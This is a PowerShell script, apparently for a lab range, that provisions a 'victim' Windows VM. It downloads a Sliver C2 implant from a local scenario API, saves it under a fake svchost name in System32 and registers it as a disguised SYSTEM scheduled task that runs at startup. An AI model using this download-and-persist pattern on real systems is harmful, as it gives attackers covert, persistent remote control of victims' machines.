# Provision a Windows victim VM
# Downloads and installs a Sliver beacon as a scheduled task

param()

$ErrorActionPreference = "Stop"
$C2Host  = if ($env:C2_HOST)  { $env:C2_HOST  } else { "192.168.56.10" }
$ApiBase = "http://${C2Host}:8080/api/v1"
$ImplantPath = "C:\Windows\System32\svchost_update.exe"
$TaskName    = "WindowsUpdateHelper"

function Write-Log { param([string]$Msg) Write-Host "[provision] $Msg" }

# ── Wait for scenario API ─────────────────────────────────────────────────
Write-Log "Waiting for scenario API at $ApiBase..."
$timeout = 120
$elapsed = 0
while ($elapsed -lt $timeout) {
    try {
        $null = Invoke-WebRequest -Uri "$ApiBase/health" -UseBasicParsing -TimeoutSec 5
        Write-Log "API is reachable"
        break
    } catch {
        Start-Sleep -Seconds 5
        $elapsed += 5
    }
}

if ($elapsed -ge $timeout) {
    Write-Log "WARNING: API not reachable after ${timeout}s. Implant not installed."
    exit 0
}

# ── Download implant ──────────────────────────────────────────────────────
$hostname = $env:COMPUTERNAME
$url = "$ApiBase/implant/windows?name=$hostname&c2=$C2Host"
Write-Log "Requesting implant from $url"
try {
    Invoke-WebRequest -Uri $url -OutFile $ImplantPath -UseBasicParsing
    Write-Log "Implant downloaded to $ImplantPath"
} catch {
    Write-Log "Failed to download implant: $_"
    exit 0
}

# ── Install as scheduled task ─────────────────────────────────────────────
Write-Log "Installing scheduled task '$TaskName'..."
$action  = New-ScheduledTaskAction -Execute $ImplantPath
$trigger = New-ScheduledTaskTrigger -AtStartup
$settings = New-ScheduledTaskSettingsSet -RestartCount 10 -RestartInterval (New-TimeSpan -Minutes 1)
$principal = New-ScheduledTaskPrincipal -UserId "SYSTEM" -LogonType ServiceAccount -RunLevel Highest

Register-ScheduledTask -TaskName $TaskName `
    -Action $action `
    -Trigger $trigger `
    -Settings $settings `
    -Principal $principal `
    -Force | Out-Null

# Run immediately
Start-ScheduledTask -TaskName $TaskName

Write-Log ""
Write-Log "══════════════════════════════════════════════"
Write-Log "  Windows victim provisioned"
Write-Log "  Hostname: $hostname"
Write-Log "  Implant:  $ImplantPath"
Write-Log "  C2:       ${C2Host}:31337"
Write-Log "══════════════════════════════════════════════"
